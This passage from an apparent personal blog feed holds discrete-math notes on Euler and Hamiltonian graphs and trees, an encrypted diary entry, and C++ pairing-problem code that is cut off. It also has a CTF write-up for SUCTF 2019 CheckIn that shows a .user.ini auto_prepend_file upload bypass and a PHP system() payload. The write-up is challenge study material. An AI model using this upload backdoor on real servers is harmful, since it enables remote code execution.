G是半欧拉图<br>&lt;=&gt;(2) G中恰有2个奇度顶点  </li><li>有向欧拉图的充分必要条件<br>定理8.3: 设G是有向连通图,则G是欧拉图<br>&lt;=&gt; 任意v∈V(G), d^{+}(v)=d^{-}(v)<br>&lt;=&gt; G是若干个边不交有向圈的并  </li><li>有向半欧拉图的充分必要条件<br>定理8.4: 设G是无向连通图,则G是半欧拉图<br>&lt;=&gt; G中恰有2个奇度顶点, 其中1个入度比出度大1,另1个出度比入度大1, 其余顶点入度等于出度.  </li></ol><p><img src="/images/pasted-0.png" alt="upload successful" loading="lazy"></p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><h4 id="Fleury算法-避桥法"><a href="#Fleury算法-避桥法" class="headerlink" title="Fleury算法(避桥法)"></a>Fleury算法(避桥法)</h4><ol><li>从任意一点开始, 沿着没有走过的边向前走  </li><li>在每个顶点, 优先选择剩下的<strong>非桥边</strong>, 除非只有唯一一条边  </li><li>直到得到欧拉回路或宣布失败  </li><li>定理8.5: 设G是无向欧拉图,则Fleury算法终止时得到的简单通路是欧拉回路.  </li></ol><p>Fleury算法(递归形式)</p><pre><code>if d(v)&gt;1 then e:=v关联的任意非割边else e:=v关联的唯一边u:=e的另一个端点.</code></pre><p>递归地求G-e的从u到w的欧拉通路把e接续在递归求出的通路上</p><p>Fleury算法(迭代形式)</p><pre><code>(1) P0:=v;(2) 设Pi=v0e1v1e2…eivi已经行遍,设Gi=G-{e1,e2 ,… ,ei},ei+1:= Gi中满足如下2条件的边:(a) ei+1与vi关联(b) 除非别无选择,否则ei+1不是Gi中的桥(3) 若Gi不等于Ni, 则回到(2); 否则算法停止</code></pre><p>举例：</p><p><img src="/images/pasted-1.png" alt="upload successful" loading="lazy"></p><h4 id="逐步插入回路算法"><a href="#逐步插入回路算法" class="headerlink" title="逐步插入回路算法"></a>逐步插入回路算法</h4><ol><li>每次求出一个简单回路  </li><li>把新求出的回路插入老回路, 合并成一个更大的回路  </li><li>直到得到欧拉回路或宣布失败</li></ol><p><img src="/images/pasted-2.png" alt="upload successful" loading="lazy"></p><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><ol><li>轮盘设计<br><code>000,001,010,011,100,101,110,111</code><pre><code>D=&lt;V,E&gt;, V={00,01,10,11},E={ abc=&lt;ab,bc&gt; | a,b,c∈{0,1} }</code></pre></li><li>基因测序</li></ol><h2 id="哈密顿图"><a href="#哈密顿图" class="headerlink" title="哈密顿图"></a>哈密顿图</h2><h3 id="基本概念-4"><a href="#基本概念-4" class="headerlink" title="基本概念"></a>基本概念</h3><ol><li>哈密顿通路：经过图中所有定点的初级通路</li><li>半哈密顿图：有哈密顿通路的图</li><li>哈密顿回路：经过图中所有顶点的初级回路</li><li>哈密顿图：有哈密顿回路的图</li><li>边不重的哈密顿回路</li></ol><h3 id="定理-1"><a href="#定理-1" class="headerlink" title="定理"></a>定理</h3><ol><li>无向哈密顿图的必要条件<br>定理8.6: 设G=&lt;V,E&gt;是无向哈密顿图, 则对V的任意非空真子集V1有p(G-V1) &lt;=|V1|。<br>证明：<br>设C是G中任意哈密顿回路, 当V1中顶点在C中都不相邻时, p(C-V1)=|V1|最大;<br>否则, p(C-V1)&lt;|V1|. C是G的生成子图,<br>所以p(G-V1)&lt;=P(C-V1)&lt;=|V1|.<br>反例：<br>Petersen图<br> <img src="/images/pasted-3.png" alt="upload successful" loading="lazy"></li><li>无向半哈密顿图的必要条件<br>定理8.7: 设G=&lt;V,E&gt;是无向半哈密顿图,则对V的任意非空真子集V1有p(G-V1)&lt;=|V1|+1  </li><li>无向半哈密顿图的充分条件<br> 定理8.7: 设G是n(&gt;=2)阶无向简单图, 若对G中任意不相邻顶点u与v有d(u)+d(v)&gt;=n-1.则G是半哈密顿图<br>证: 只需证明<br>(1) G连通 <img src="/images/pasted-4.png" alt="upload successful" loading="lazy"><br>(2) 由极大路径可得圈 <img src="/images/pasted-5.png" alt="upload successful" loading="lazy"><br>(3) 由圈可得更长路径 <img src="/images/pasted-6.png" alt="upload successful" loading="lazy"><br><strong>推论1:</strong> 设G是n(&gt;=3)阶无向简单图,若对G中任意不相邻顶点u与v有d(u)+d(v)&gt;=n则G是哈密顿图.<br>证: 由定理8.7知G连通且有哈密顿通路 T=v0v1…vn<br>若(v0,vn)∈E, 则得哈密顿回路C=v0v1…vnv0.<br>若(v0,vk)∉E, 则与定理8.7证明(2)类似,也存在哈密顿回路.<br><strong>推论2:</strong> 设G是n(&gt;=3)阶无向简单图,若对G中任意顶点u有d(u)&gt;=n/2则G是哈密顿图.<br>定理8.8: 设u,v是无向n阶简单图G中两个不相邻顶点,且d(u)+d(v)&gt;=n, 则<br>G是哈密顿图 &lt;=&gt;G∪(u,v)是哈密顿图. </li><li>有向半哈密顿图的充分条件<br>定理8.9: 设D是n(&gt;=2)阶竞赛图,则D是半哈密顿图.<br>推论:设D是n阶有向图, 若D含n阶竞赛图作为子图,则D是半哈密顿图</li><li>有向哈密顿图的充分条件<br>定理8.10: 强连通的竞赛图是哈密顿图.<br>证: n=1时,平凡图是哈密顿图.<br>n=2时,不可能强连通.<br>下面设n&gt;=3. 只需证明:<br>(1) D中存在长度为3的圈.<br>(2) D中存在长度为k的圈=&gt; D中存在长度为k+1的圈.<br>证明：<br> <img src="/images/pasted-7.png" alt="upload successful" loading="lazy"><br> <img src="/images/pasted-8.png" alt="upload successful" loading="lazy"><br> <img src="/images/pasted-9.png" alt="upload successful" loading="lazy"><br> <img src="/images/pasted-10.png" alt="upload successful" loading="lazy"><br> <img src="/images/pasted-11.png" alt="upload successful" loading="lazy"><br>推论：设D是n阶有向图, 若D含n阶强连通竞赛图作为子图,则D是哈密顿图.</li><li>定理8.11<br><img src="/images/pasted-12.png" alt="upload successful" loading="lazy"><br>推论:完全图K_{2k}(k&gt;=2)中同时有k-1条边不重的哈密顿回路, 除此之外, 剩下的是k条彼此不相邻的边</li></ol><h2 id="树"><a href="#树" class="headerlink" title="树"></a>树</h2><h3 id="基本概念-5"><a href="#基本概念-5" class="headerlink" title="基本概念"></a>基本概念</h3><ol><li>树: 连通无回图 常用T表示树</li><li>树叶(leaf): 树中1度顶点</li><li>分支点: 树中2度以上顶点</li><li>平凡树: 平凡图(无树叶,无分支点)</li><li>森林(forest): 无回图<br>森林的每个连通分支都是树</li><li>无向树的计数: tn:n(1)阶非同构无向树的个数</li><li>星: Sn=K1,n-1.</li><li>生成树</li><li>树枝(tree edge): e∈E(T), n-1条</li><li>弦(chord): e∈E(G)-E(T), m-n+1条</li><li>余树(): <code>G[E(G)-E(T)] = T</code></li><li>基本回路:T∪e’r中的唯一回路Cr</li><li>基本回路系统: {C1,C2,…,Cm-n+1}</li><li>圈秩ξ(G): ξ(G)=m-n+1 (ξ: xi)</li><li>基本割集: er对应的唯一割集Sr</li><li>基本割集系统: {S1,S2,…,Sn-1}</li><li>割集秩η(G): η(G)=n-1 (η: eta)</li><li>生成树的计数:τ(G): 标定图G的生成树的个数</li></ol><h3 id="基本定理-2"><a href="#基本定理-2" class="headerlink" title="基本定理"></a>基本定理</h3><ol><li>树的等价定义<br>定理9.1: 设<code>G=&lt;V,E&gt;</code>是n阶m边无向图,则<br>(1) G是树(连通无回)<br>&lt;=&gt; (2) G中任何2顶点之间有唯一路径<br>&lt;=&gt; (3) G无圈 ^ m=n-1<br>&lt;=&gt; (4) G连通 ^ m=n-1<br>&lt;=&gt; (5) G极小连通: 连通 ^ 所有边是桥<br>&lt;=&gt; (6) G极大无回: 无圈 ^ 增加任何新边产生唯一圈</li><li>定理9.2:非平凡树至少有2个树叶<br>证明: 设T有x个树叶, 由定理1和握手定理,<br> 2m = 2(n-1) = 2n-2 = d(v)<br> = ∑v是树叶d(v) + ∑v是分支点d(v)<br> ≥ x + 2(n-x) = 2n-x, 所以 x≥2. </li><li>定理9.3:无向图G连通  G有生成树<br> <img src="/images/pasted-23.png" alt="upload successful" loading="lazy"></li><li><img src="/images/pasted-24.png" alt="upload successful" loading="lazy"></li><li>定理9.4:设G是连通图, T是G的生成树, e是T的弦, 则T∪e中存在由弦e和其他树枝组成的圈, 并且不同的弦对应不同的圈.</li><li>定理9.5:设G是连通图, T是G的生成树, e是T的树枝, 则G中存在由树枝e和其他弦组成的割集, 并且不同的树枝对应不同的割集.</li><li>τ(G) = τ(G-e) + τ(G\e)</li></ol><h2 id="图的矩阵表示"><a href="#图的矩阵表示" class="headerlink" title="图的矩阵表示"></a>图的矩阵表示</h2><h3 id="有向图关联矩阵"><a href="#有向图关联矩阵" class="headerlink" title="有向图关联矩阵"></a>有向图关联矩阵</h3><p><img src="/images/pasted-25.png" alt="upload successful" loading="lazy"><br> 有向图关联矩阵性质<br><img src="/images/pasted-26.png" alt="upload successful" loading="lazy"></p><h3 id="无向图关联矩阵"><a href="#无向图关联矩阵" class="headerlink" title="无向图关联矩阵"></a>无向图关联矩阵</h3><p><img src="/images/pasted-27.png" alt="upload successful" loading="lazy"><br>无向图关联矩阵性质</p><p><img src="/images/pasted-28.png" alt="upload successful" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 离散数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF 2019 CheckIn</title>
      <link href="/2020/CTF/CheckIn/"/>
      <url>/2020/CTF/CheckIn/</url>
      
        <content type="html"><![CDATA[<!--more--><h2 id="利用-user-ini文件构造后门"><a href="#利用-user-ini文件构造后门" class="headerlink" title="利用.user.ini文件构造后门"></a>利用<code>.user.ini</code>文件构造后门</h2><p>绕过黑名单检验</p><pre><code>GIF89a                  //绕过exif_imagetype(),加上了gif的头auto_prepend_file=a.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。auto_append_file=a.jpg  //解析后进行包含</code></pre><h2 id="绕过exif-imagetype"><a href="#绕过exif-imagetype" class="headerlink" title="绕过exif_imagetype()"></a>绕过exif_imagetype()</h2><p>采用xbm格式X Bit Map，绕过exif_imagetype()方法的检测，上传文件来解析。<br>在计算机图形学中，X Window系统使用X BitMap，一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图。<br>XBM数据由一系列包含单色像素数据的静态无符号字符数组组成，当格式被普遍使用时，XBM通常出现在标题.h文件中，每个图像在标题中存储一个数组。<br>也就是用c代码来标识一个xbm文件，前两个#defines指定位图的高度和宽度【以像素为单位，比如以下xbm文件：</p><pre><code>#define test_width 16#define test_height 7</code></pre><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>上传一个a.jpg 文件</p><pre><code>GIF89a&lt;script language=&#39;php&#39;&gt;system(&#39;cat /flag&#39;);&lt;/script&gt;</code></pre><p>然后访问upload/xxx/index.php就出现了flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-5-9</title>
      <link href="/2020/diary/2020-5/2020-5-9/"/>
      <url>/2020/diary/2020-5/2020-5-9/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="911e343a3bbb099db6cdd0ddb85c063dc966df81f8817df4f835f8a88b7b0d1d">e32c27e47419b87d293b9e8ce412adf8a62cf3f2f4a0d794ee9106f21c71bf9962c810a9e5d413731ee3389f714a8885813ca9333679ad3d8d40e6ca8801e9591882e2ab14a9307f6791a5ff07caa7ba42464a530e372fac70e4409d115ed9ee5f4f5d3a599aa611fcf0fc6b8c1453dd15802bd15963da30ccd18d117683f1c4f554de12b4ace47af7c707c005e01cd9a731301ea255752b12027474d9b3d965192fdddbb9e5b893a77eaee1d86a9ba75ef9c57f4a89eb36cd360abff0b8be7f6ff997bb74de8b3fde0a1efc5f4abcacf35708e822e7141b6c57d07199ce846ee8bf2b30945197a4d936d80bf97f6a65e9d334868ea2ce88d7ef4c1317a82f03bb549d5a81bec3c9387983fdbaefd031579b19c3165a2c2bfe39412fb93f454adeb2dd6dfb13700e63028cae0c694d0c176fd6fa0aa0a4fdae6e0d2b2ee0fc0d57f25a7cf41938095ce0e563e0fa66a36fe63bd33e0396d0b8f29935a4ab2cba</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运动员最佳配对问题</title>
      <link href="/2020/ACM/%E8%BF%90%E5%8A%A8%E5%91%98%E6%9C%80%E4%BD%B3%E9%85%8D%E5%AF%B9%E9%97%AE%E9%A2%98/"/>
      <url>/2020/ACM/%E8%BF%90%E5%8A%A8%E5%91%98%E6%9C%80%E4%BD%B3%E9%85%8D%E5%AF%B9%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<!--more--><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote><p>羽毛球队有男女运动员各n人，给定2个n×n矩阵P和Q。P[i][j]是男运动员i和女运动员j配对组成混合双打的男运动员竞赛优势；Q[i][j]则是女运动员i和男运动员j配合的女运动员竞赛优势。</p></blockquote><blockquote><p>由于技术配合和心理状态等各种因素的影响，P[i][j]不一定等于Q[j][i]。男运动员i和女运动员j配对组成混合双打的男女双方竞赛优势为P[i][j]*Q[j][i]。设计一个算法，计算男女运动员的最佳配对法，使各组男女双方竞赛优势的总和达到最大。</p></blockquote><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>因为是配对问题，所以可以将女运动员的顺序固定为序号升序排列（即0,1,2……，n-1）,只对男运动员的顺序进行广度优先搜索。<br>建立一个节点Node存放当前配对的上界rcost，当前男运动员顺序x[],当前节点的层数s，当前优势cc。<br>每次固定一个顺序时，将节点的上界rcost更新为原来的rcost-MaxOut[i]（男运动员i的最大优势）+val[i][s]（男运动员i的实际优势）。</p><p>对于剪枝函数可以将Node节点的优先级按rcost降序排列。<br>因此当取出的节点t的上界rcost&lt;=bestc时，可以直接剪枝，因为之后的配对顺序的最大优势也肯定比bestc小，不必再去搜索后面的节点。</p><p>另外建立Contest类，用于进行搜索运算，存放目前最大的优势bestc，每个男运动员的最大优势MaxOut[]，最大优势总和（最大上界）MaxSum。</p><p>时间复杂度分析：<br>因为是枚举所有的排列，而限界函数对复杂度没有影响，因此时间复杂度为O(n!)。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstdio></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;queue></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token keyword">int</span> p<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>q<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> MaxSum<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Node</span><span class="token comment" spellcheck="true">//节点</span><span class="token punctuation">{</span>    <span class="token keyword">public</span><span class="token operator">:</span>        <span class="token keyword">void</span> <span class="token function">Init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> x<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>rcost<span class="token punctuation">,</span>s<span class="token punctuation">,</span>cc<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">void</span> Node<span class="token operator">::</span><span class="token function">Init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//节点初始化</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>    s <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    cc <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    rcost <span class="token operator">=</span> MaxSum<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">bool</span> <span class="token keyword">operator</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span>Node a<span class="token punctuation">,</span>Node b<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//重载小于号，定义优先级</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> a<span class="token punctuation">.</span>rcost<span class="token operator">&lt;</span>b<span class="token punctuation">.</span>rcost<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Contest</span><span class="token punctuation">{</span>    <span class="token keyword">public</span><span class="token operator">:</span>        <span class="token keyword">void</span> <span class="token function">Init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> <span class="token function">GetResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> bestc<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//最优解</span>        <span class="token keyword">int</span> val<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>MaxOut<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//男运动员i的最大优势</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">void</span> Contest<span class="token operator">::</span><span class="token function">Init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//初始化</span><span class="token punctuation">{</span>    bestc <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//初始化最优解</span>    MaxSum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//初始化最大优势总和</span>    <span class="token function">memset</span><span class="token punctuation">(</span>MaxOut<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>MaxOut<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//i为男运动员编号</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//j为女运动员编号</span>        <span class="token punctuation">{</span>            val<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">*</span>q<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>val<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">></span>MaxOut<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                MaxOut<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        MaxSum <span class="token operator">+</span><span class="token operator">=</span> MaxOut<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> Contest<span class="token operator">::</span><span class="token function">GetResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">Init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//初始化</span>    priority_queue<span class="token operator">&lt;</span>Node<span class="token operator">></span> que<span class="token punctuation">;</span>    Node t<span class="token punctuation">;</span>    t<span class="token punctuation">.</span><span class="token function">Init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    que<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>que<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//队列不空</span>    <span class="token punctuation">{</span>        t <span class="token operator">=</span> que<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//取一节点</span>        que<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//如果当前排列的上界&lt;当前最优解，就退出循环</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>s<span class="token operator">></span>n<span class="token number">-1</span> <span class="token operator">||</span> t<span class="token punctuation">.</span>rcost<span class="token operator">&lt;=</span>bestc<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>s <span class="token operator">==</span> n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果排列完</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>val<span class="token punctuation">[</span>t<span class="token punctuation">.</span>x<span class="token punctuation">[</span>n<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>t<span class="token punctuation">.</span>s<span class="token punctuation">]</span><span class="token operator">+</span>t<span class="token punctuation">.</span>cc<span class="token operator">></span>bestc<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//当前优势>当前最优解</span>            <span class="token punctuation">{</span>                bestc <span class="token operator">=</span> val<span class="token punctuation">[</span>t<span class="token punctuation">.</span>x<span class="token punctuation">[</span>n<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>t<span class="token punctuation">.</span>s<span class="token punctuation">]</span><span class="token operator">+</span>t<span class="token punctuation">.</span>cc<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//更新最优解</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token comment" spellcheck="true">//没有排列完</span>        <span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> t<span class="token punctuation">.</span>s<span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//从未排列的男运动员中挑一人</span>            <span class="token punctuation">{</span>                <span class="token keyword">int</span> cc <span class="token operator">=</span> t<span class="token punctuation">.</span>cc<span class="token operator">+</span>val<span class="token punctuation">[</span>t<span class="token punctuation">.</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>t<span class="token punctuation">.</span>s<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> rcost <span class="token operator">=</span> t<span class="token punctuation">.</span>rcost <span class="token operator">-</span> MaxOut<span class="token punctuation">[</span>t<span class="token punctuation">.</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> val<span class="token punctuation">[</span>t<span class="token punctuation">.</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>t<span class="token punctuation">.</span>s<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//更新当前排列的上界</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>rcost<span class="token operator">></span>bestc<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果>当前最优解，就进行扩展</span>                <span class="token punctuation">{</span>                    Node cur<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//新建节点</span>                    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>                        cur<span class="token punctuation">.</span>x<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token punctuation">.</span>x<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                    cur<span class="token punctuation">.</span>x<span class="token punctuation">[</span>t<span class="token punctuation">.</span>s<span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token punctuation">.</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                    cur<span class="token punctuation">.</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token punctuation">.</span>x<span class="token punctuation">[</span>t<span class="token punctuation">.</span>s<span class="token punctuation">]</span><span class="token punctuation">;</span>                    cur<span class="token punctuation">.</span>s <span class="token operator">=</span> t<span class="token punctuation">.</span>s<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>                    cur<span class="token punctuation">.</span>cc <span class="token operator">=</span> cc<span class="token punctuation">;</span>                    cur<span class="token punctuation">.</span>rcost <span class="token operator">=</span> rcost<span class="token punctuation">;</span>                    que<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//插入节点</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> bestc<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回最优解</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">freopen</span><span class="token punctuation">(</span><span class="token string">"input.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">freopen</span><span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">,</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    clock_t start<span class="token punctuation">,</span>end<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cin<span class="token operator">>></span>n <span class="token operator">&amp;&amp;</span> n<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i  <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>                cin<span class="token operator">>></span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i  <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span 